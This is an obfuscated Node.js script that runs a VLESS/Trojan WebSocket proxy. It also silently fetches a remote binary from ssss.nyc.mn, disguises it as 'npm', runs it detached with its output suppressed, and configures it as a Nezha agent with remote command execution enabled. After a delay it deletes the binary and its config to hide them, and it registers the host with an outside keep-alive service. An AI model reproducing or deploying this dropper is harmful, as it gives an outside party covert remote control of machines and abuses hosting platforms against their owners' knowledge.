function _0x42bf(_0x50b4cf,_0x254f90){_0x50b4cf=_0x50b4cf-0x16f;const _0x7a0dbc=_0x7a0d();let _0x42bfa3=_0x7a0dbc[_0x50b4cf];return _0x42bfa3;}const _0x421254=_0x42bf;(function(_0x1c682d,_0xc6975){const _0x1ac17f=_0x42bf,_0x56aa2c=_0x1c682d();while(!![]){try{const _0x311e97=-parseInt(_0x1ac17f(0x18d))/0x1*(parseInt(_0x1ac17f(0x188))/0x2)+-parseInt(_0x1ac17f(0x1c8))/0x3+-parseInt(_0x1ac17f(0x171))/0x4*(-parseInt(_0x1ac17f(0x17d))/0x5)+parseInt(_0x1ac17f(0x1ca))/0x6+-parseInt(_0x1ac17f(0x1d9))/0x7+parseInt(_0x1ac17f(0x1d5))/0x8+parseInt(_0x1ac17f(0x1d0))/0x9*(parseInt(_0x1ac17f(0x1b9))/0xa);if(_0x311e97===_0xc6975)break;else _0x56aa2c['push'](_0x56aa2c['shift']());}catch(_0x31962d){_0x56aa2c['push'](_0x56aa2c['shift']());}}}(_0x7a0d,0xbb677));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x421254(0x1cd)),net=require(_0x421254(0x1c6)),path=require(_0x421254(0x19c)),crypto=require(_0x421254(0x184)),{Buffer}=require(_0x421254(0x1da)),{exec,execSync}=require(_0x421254(0x19d)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x421254(0x16f)]['UUID']||'e80428bf-7a2b-4fce-85d0-6a08ad1f8c3c',NEZHA_SERVER=process[_0x421254(0x16f)][_0x421254(0x1bf)]||'',NEZHA_PORT=process['env'][_0x421254(0x17f)]||'',NEZHA_KEY=process[_0x421254(0x16f)][_0x421254(0x1ba)]||'',DOMAIN=process[_0x421254(0x16f)][_0x421254(0x1d3)]||'1234.abc.com',AUTO_ACCESS=process[_0x421254(0x16f)]['AUTO_ACCESS']||!![],WSPATH=process[_0x421254(0x16f)][_0x421254(0x1c2)]||UUID[_0x421254(0x1b7)](0x0,0x8),SUB_PATH=process[_0x421254(0x16f)]['SUB_PATH']||_0x421254(0x1df),NAME=process[_0x421254(0x16f)][_0x421254(0x180)]||'Hug',PORT=process['env'][_0x421254(0x1b6)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x26c205=_0x421254;try{const _0x54e121=await axios[_0x26c205(0x1bc)]('https://speed.cloudflare.com/meta'),_0x1428ae=_0x54e121[_0x26c205(0x18b)];ISP=(_0x1428ae['country']+'-'+_0x1428ae[_0x26c205(0x193)])[_0x26c205(0x17b)](/ /g,'_');}catch(_0x5ea313){ISP=_0x26c205(0x1c4);}};GetISP();const httpServer=http[_0x421254(0x19b)]((_0x4f4cb3,_0x283d3d)=>{const _0x49c3c8=_0x421254;if(_0x4f4cb3['url']==='/'){const _0x4e55a6=path[_0x49c3c8(0x17a)](__dirname,'index.html');fs[_0x49c3c8(0x186)](_0x4e55a6,'utf8',(_0x16863a,_0x171bc3)=>{const _0x39b533=_0x49c3c8;if(_0x16863a){_0x283d3d[_0x39b533(0x1be)](0xc8,{'Content-Type':'text/html'}),_0x283d3d[_0x39b533(0x1d8)]('Hello\x20world!');return;}_0x283d3d[_0x39b533(0x1be)](0xc8,{'Content-Type':'text/html'}),_0x283d3d[_0x39b533(0x1d8)](_0x171bc3);});return;}else{if(_0x4f4cb3[_0x49c3c8(0x1af)]==='/'+SUB_PATH){const _0xeecf6e='vless://'+UUID+'@'+DOMAIN+_0x49c3c8(0x1c1)+DOMAIN+_0x49c3c8(0x1c3)+DOMAIN+_0x49c3c8(0x1a1)+WSPATH+'#'+NAME+'-'+ISP,_0x553767='trojan://'+UUID+'@'+DOMAIN+_0x49c3c8(0x1a9)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x49c3c8(0x1a1)+WSPATH+'#'+NAME+'-'+ISP,_0x2d811f=_0xeecf6e+'\x0a'+_0x553767,_0x2c031e=Buffer['from'](_0x2d811f)[_0x49c3c8(0x178)](_0x49c3c8(0x187));_0x283d3d[_0x49c3c8(0x1be)](0xc8,{'Content-Type':_0x49c3c8(0x1e0)}),_0x283d3d[_0x49c3c8(0x1d8)](_0x2c031e+'\x0a');}else _0x283d3d[_0x49c3c8(0x1be)](0x194,{'Content-Type':_0x49c3c8(0x1e0)}),_0x283d3d[_0x49c3c8(0x1d8)](_0x49c3c8(0x1ce));}}),wss=new WebSocket[(_0x421254(0x1a4))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x421254(0x177)];function _0x7a0d(){const _0x5f4f0d=['readFile','base64','6McDmlq','test','sha224','data','close','454094vmaeRQ','\x20-p\x20','readUInt8','log','https://amd64.ssss.nyc.mn/agent','https://','asOrganization','createWriteStream','https://amd64.ssss.nyc.mn/v1','writeFileSync','arch','Server\x20is\x20running\x20on\x20port\x20','2053','catch','createServer','path','child_process','setsid\x20nohup\x20./npm\x20-s\x20','every','chmod\x20+x\x20npm','&path=%2F','error','connection','Server','--tls','npm','listen','hex',':443?security=tls&sni=','Automatic\x20Access\x20Task\x20added\x20successfully','application/dns-json','8443','pipe','Answer','url','config.yaml','decode','readUInt16BE','npm\x20is\x20running','map','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','PORT','slice','https://arm64.ssss.nyc.mn/v1','389540GdwMXB','NEZHA_KEY','includes','get','stream','writeHead','NEZHA_SERVER','/bin/bash',':443?encryption=none&security=tls&sni=','WSPATH','&fp=chrome&type=ws&host=','Unknown','write','net','message','326367scEFdg','then','8254770GXaAgS','concat','digest','axios','Not\x20Found\x0a','createHash','9eGOwLj','Failed\x20to\x20resolve\x20','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','DOMAIN','arm64','9576096doVbOW','https://arm64.ssss.nyc.mn/agent','https://oooo.serv00.net/add-url','end','8787002VhGxRA','buffer','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','length','client_secret:\x20','&type=A','sub','text/plain','env','error:\x20','4haUxkE','https://dns.google/resolve?name=','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','2087','connect','reduce','1.1.1.1','toString','substr','join','replace','Status','4411015sAZqXE','aarch64','NEZHA_PORT','NAME','unlink','npm\x20download\x20successfully','npm\x20running\x20error:','crypto','finish'];_0x7a0d=function(){return _0x5f4f0d;};return _0x7a0d();}function resolveHost(_0x19b808){return new Promise((_0x4f21a9,_0x10d93a)=>{const _0x4e1c3d=_0x42bf;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4e1c3d(0x189)](_0x19b808)){_0x4f21a9(_0x19b808);return;}let _0x26ec54=0x0;function _0x4907cb(){const _0x21ae79=_0x4e1c3d;if(_0x26ec54>=DNS_SERVERS[_0x21ae79(0x1dc)]){_0x10d93a(new Error(_0x21ae79(0x1d1)+_0x19b808+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x43e72d=DNS_SERVERS[_0x26ec54];_0x26ec54++;const _0x1f22f9=_0x21ae79(0x172)+encodeURIComponent(_0x19b808)+_0x21ae79(0x1de);axios[_0x21ae79(0x1bc)](_0x1f22f9,{'timeout':0x1388,'headers':{'Accept':_0x21ae79(0x1ab)}})[_0x21ae79(0x1c9)](_0x4f04e6=>{const _0x497357=_0x21ae79,_0x4edf17=_0x4f04e6[_0x497357(0x18b)];if(_0x4edf17[_0x497357(0x17c)]===0x0&&_0x4edf17[_0x497357(0x1ae)]&&_0x4edf17[_0x497357(0x1ae)][_0x497357(0x1dc)]>0x0){const _0x32a2a4=_0x4edf17[_0x497357(0x1ae)]['find'](_0x48c588=>_0x48c588['type']===0x1);if(_0x32a2a4){_0x4f21a9(_0x32a2a4[_0x497357(0x18b)]);return;}}_0x4907cb();})[_0x21ae79(0x19a)](_0x2a3a09=>{_0x4907cb();});}_0x4907cb();});}function handleVlessConnection(_0x14d593,_0x2cdfdb){const _0x199ed1=_0x421254,[_0x2e5790]=_0x2cdfdb,_0x27851b=_0x2cdfdb['slice'](0x1,0x11);if(!_0x27851b[_0x199ed1(0x19f)]((_0x28db2e,_0x1dc071)=>_0x28db2e==parseInt(uuid[_0x199ed1(0x179)](_0x1dc071*0x2,0x2),0x10)))return![];let _0x316f2d=_0x2cdfdb[_0x199ed1(0x1b7)](0x11,0x12)[_0x199ed1(0x18f)]()+0x13;const _0x16cd14=_0x2cdfdb['slice'](_0x316f2d,_0x316f2d+=0x2)[_0x199ed1(0x1b2)](0x0),_0x3c6612=_0x2cdfdb[_0x199ed1(0x1b7)](_0x316f2d,_0x316f2d+=0x1)['readUInt8'](),_0x5936a7=_0x3c6612==0x1?_0x2cdfdb[_0x199ed1(0x1b7)](_0x316f2d,_0x316f2d+=0x4)[_0x199ed1(0x17a)]('.'):_0x3c6612==0x2?new TextDecoder()[_0x199ed1(0x1b1)](_0x2cdfdb['slice'](_0x316f2d+0x1,_0x316f2d+=0x1+_0x2cdfdb['slice'](_0x316f2d,_0x316f2d+0x1)[_0x199ed1(0x18f)]())):_0x3c6612==0x3?_0x2cdfdb[_0x199ed1(0x1b7)](_0x316f2d,_0x316f2d+=0x10)['reduce']((_0xc8d1bc,_0x4a1106,_0x139f67,_0x2dfdb4)=>_0x139f67%0x2?_0xc8d1bc[_0x199ed1(0x1cb)](_0x2dfdb4[_0x199ed1(0x1b7)](_0x139f67-0x1,_0x139f67+0x1)):_0xc8d1bc,[])[_0x199ed1(0x1b4)](_0x21894e=>_0x21894e['readUInt16BE'](0x0)[_0x199ed1(0x178)](0x10))[_0x199ed1(0x17a)](':'):'';_0x14d593['send'](new Uint8Array([_0x2e5790,0x0]));const _0xa0f3fa=createWebSocketStream(_0x14d593);return resolveHost(_0x5936a7)[_0x199ed1(0x1c9)](_0x113265=>{net['connect']({'host':_0x113265,'port':_0x16cd14},function(){const _0x5c6410=_0x42bf;this[_0x5c6410(0x1c5)](_0x2cdfdb[_0x5c6410(0x1b7)](_0x316f2d)),_0xa0f3fa['on'](_0x5c6410(0x1a2),()=>{})['pipe'](this)['on'](_0x5c6410(0x1a2),()=>{})[_0x5c6410(0x1ad)](_0xa0f3fa);})['on']('error',()=>{});})[_0x199ed1(0x19a)](_0x42c6d2=>{const _0x426c80=_0x199ed1;net[_0x426c80(0x175)]({'host':_0x5936a7,'port':_0x16cd14},function(){const _0xf8f71d=_0x426c80;this['write'](_0x2cdfdb[_0xf8f71d(0x1b7)](_0x316f2d)),_0xa0f3fa['on']('error',()=>{})['pipe'](this)['on'](_0xf8f71d(0x1a2),()=>{})[_0xf8f71d(0x1ad)](_0xa0f3fa);})['on'](_0x426c80(0x1a2),()=>{});}),!![];}function handleTrojanConnection(_0x2c7173,_0x4c5ae7){const _0x29f0be=_0x421254;try{if(_0x4c5ae7[_0x29f0be(0x1dc)]<0x3a)return![];const _0x251784=_0x4c5ae7[_0x29f0be(0x1b7)](0x0,0x38)[_0x29f0be(0x178)](),_0x38a464=[UUID];let _0x305cda=null;for(const _0x179cb1 of _0x38a464){const _0x30386e=crypto[_0x29f0be(0x1cf)](_0x29f0be(0x18a))['update'](_0x179cb1)[_0x29f0be(0x1cc)](_0x29f0be(0x1a8));if(_0x30386e===_0x251784){_0x305cda=_0x179cb1;break;}}if(!_0x305cda)return![];let _0x29f9d6=0x38;_0x4c5ae7[_0x29f9d6]===0xd&&_0x4c5ae7[_0x29f9d6+0x1]===0xa&&(_0x29f9d6+=0x2);const _0x3dd965=_0x4c5ae7[_0x29f9d6];if(_0x3dd965!==0x1)return![];_0x29f9d6+=0x1;const _0x2c08c6=_0x4c5ae7[_0x29f9d6];_0x29f9d6+=0x1;let _0x496f25,_0x2f8cca;if(_0x2c08c6===0x1)_0x496f25=_0x4c5ae7['slice'](_0x29f9d6,_0x29f9d6+0x4)[_0x29f0be(0x17a)]('.'),_0x29f9d6+=0x4;else{if(_0x2c08c6===0x3){const _0x248ac5=_0x4c5ae7[_0x29f9d6];_0x29f9d6+=0x1,_0x496f25=_0x4c5ae7['slice'](_0x29f9d6,_0x29f9d6+_0x248ac5)[_0x29f0be(0x178)](),_0x29f9d6+=_0x248ac5;}else{if(_0x2c08c6===0x4)_0x496f25=_0x4c5ae7[_0x29f0be(0x1b7)](_0x29f9d6,_0x29f9d6+0x10)[_0x29f0be(0x176)]((_0x58b048,_0x5154f0,_0x336e9d,_0x563da1)=>_0x336e9d%0x2?_0x58b048[_0x29f0be(0x1cb)](_0x563da1[_0x29f0be(0x1b7)](_0x336e9d-0x1,_0x336e9d+0x1)):_0x58b048,[])['map'](_0x2ea7bb=>_0x2ea7bb['readUInt16BE'](0x0)['toString'](0x10))['join'](':'),_0x29f9d6+=0x10;else return![];}}_0x2f8cca=_0x4c5ae7[_0x29f0be(0x1b2)](_0x29f9d6),_0x29f9d6+=0x2;_0x29f9d6<_0x4c5ae7[_0x29f0be(0x1dc)]&&_0x4c5ae7[_0x29f9d6]===0xd&&_0x4c5ae7[_0x29f9d6+0x1]===0xa&&(_0x29f9d6+=0x2);const _0x43bd54=createWebSocketStream(_0x2c7173);return resolveHost(_0x496f25)['then'](_0x5005b7=>{const _0x190f2e=_0x29f0be;net[_0x190f2e(0x175)]({'host':_0x5005b7,'port':_0x2f8cca},function(){const _0x4d9cda=_0x190f2e;_0x29f9d6<_0x4c5ae7[_0x4d9cda(0x1dc)]&&this[_0x4d9cda(0x1c5)](_0x4c5ae7[_0x4d9cda(0x1b7)](_0x29f9d6)),_0x43bd54['on'](_0x4d9cda(0x1a2),()=>{})['pipe'](this)['on'](_0x4d9cda(0x1a2),()=>{})[_0x4d9cda(0x1ad)](_0x43bd54);})['on'](_0x190f2e(0x1a2),()=>{});})[_0x29f0be(0x19a)](_0x3ab59b=>{const _0x130f7b=_0x29f0be;net[_0x130f7b(0x175)]({'host':_0x496f25,'port':_0x2f8cca},function(){const _0x1b5480=_0x130f7b;_0x29f9d6<_0x4c5ae7['length']&&this[_0x1b5480(0x1c5)](_0x4c5ae7['slice'](_0x29f9d6)),_0x43bd54['on'](_0x1b5480(0x1a2),()=>{})[_0x1b5480(0x1ad)](this)['on'](_0x1b5480(0x1a2),()=>{})['pipe'](_0x43bd54);})['on'](_0x130f7b(0x1a2),()=>{});}),!![];}catch(_0x306f5e){return![];}}wss['on'](_0x421254(0x1a3),(_0x4f26a2,_0x5a0b00)=>{const _0x5e123d=_0x421254,_0x34b3ac=_0x5a0b00[_0x5e123d(0x1af)]||'';_0x4f26a2['once'](_0x5e123d(0x1c7),_0x24edc0=>{const _0x28c510=_0x5e123d;if(_0x24edc0[_0x28c510(0x1dc)]>0x11&&_0x24edc0[0x0]===0x0){const _0x30c8d8=_0x24edc0[_0x28c510(0x1b7)](0x1,0x11),_0x34c707=_0x30c8d8[_0x28c510(0x19f)]((_0x5659e7,_0x341373)=>_0x5659e7==parseInt(uuid[_0x28c510(0x179)](_0x341373*0x2,0x2),0x10));if(_0x34c707){!handleVlessConnection(_0x4f26a2,_0x24edc0)&&_0x4f26a2[_0x28c510(0x18c)]();return;}}!handleTrojanConnection(_0x4f26a2,_0x24edc0)&&_0x4f26a2['close']();})['on'](_0x5e123d(0x1a2),()=>{});});const getDownloadUrl=()=>{const _0x183276=_0x421254,_0x13b629=os[_0x183276(0x197)]();return _0x13b629==='arm'||_0x13b629===_0x183276(0x1d4)||_0x13b629===_0x183276(0x17e)?!NEZHA_PORT?_0x183276(0x1b8):_0x183276(0x1d6):!NEZHA_PORT?_0x183276(0x195):_0x183276(0x191);},downloadFile=async()=>{const _0x50c55b=_0x421254;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5791b4=getDownloadUrl(),_0x1c8df7=await axios({'method':'get','url':_0x5791b4,'responseType':_0x50c55b(0x1bd)}),_0x2959d0=fs[_0x50c55b(0x194)]('npm');return _0x1c8df7['data'][_0x50c55b(0x1ad)](_0x2959d0),new Promise((_0x2bb784,_0x4254b7)=>{const _0x5cf475=_0x50c55b;_0x2959d0['on'](_0x5cf475(0x185),()=>{const _0x1d8491=_0x5cf475;console[_0x1d8491(0x190)](_0x1d8491(0x182)),exec(_0x1d8491(0x1a0),_0x16efdd=>{if(_0x16efdd)_0x4254b7(_0x16efdd);_0x2bb784();});}),_0x2959d0['on'](_0x5cf475(0x1a2),_0x4254b7);});}catch(_0x1f4447){throw _0x1f4447;}},runnz=async()=>{const _0x5c992e=_0x421254;try{const _0x1153e0=execSync(_0x5c992e(0x173),{'encoding':'utf-8'});if(_0x1153e0['trim']()!==''){console[_0x5c992e(0x190)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x2d6161){}await downloadFile();let _0x175f27='',_0x3e2fe4=['443',_0x5c992e(0x1ac),'2096',_0x5c992e(0x174),'2083',_0x5c992e(0x199)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x289ee3=_0x3e2fe4[_0x5c992e(0x1bb)](NEZHA_PORT)?_0x5c992e(0x1a5):'';_0x175f27=_0x5c992e(0x19e)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5c992e(0x18e)+NEZHA_KEY+'\x20'+_0x289ee3+_0x5c992e(0x1db);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3e7d34=NEZHA_SERVER[_0x5c992e(0x1bb)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x59f514=_0x3e2fe4[_0x5c992e(0x1bb)](_0x3e7d34)?'true':'false',_0x39291b=_0x5c992e(0x1dd)+NEZHA_KEY+_0x5c992e(0x1b5)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x59f514+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x5c992e(0x196)](_0x5c992e(0x1b0),_0x39291b);}_0x175f27='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log'](_0x5c992e(0x1d2));return;}}try{exec(_0x175f27,{'shell':_0x5c992e(0x1c0)},_0x23648d=>{const _0x257fc9=_0x5c992e;if(_0x23648d)console[_0x257fc9(0x1a2)](_0x257fc9(0x183),_0x23648d);else console[_0x257fc9(0x190)](_0x257fc9(0x1b3));});}catch(_0x116acd){console['error'](_0x5c992e(0x170)+_0x116acd);}};async function addAccessTask(){const _0x1dccdd=_0x421254;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x25d1f1=_0x1dccdd(0x192)+DOMAIN;try{const _0x457735=await axios['post'](_0x1dccdd(0x1d7),{'url':_0x25d1f1},{'headers':{'Content-Type':'application/json'}});console[_0x1dccdd(0x190)](_0x1dccdd(0x1aa));}catch(_0x43ffa8){}}const delFiles=()=>{const _0x5662b4=_0x421254;fs[_0x5662b4(0x181)](_0x5662b4(0x1a6),()=>{}),fs[_0x5662b4(0x181)]('config.yaml',()=>{});};httpServer[_0x421254(0x1a7)](PORT,()=>{const _0x480961=_0x421254;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x480961(0x198)+PORT);});
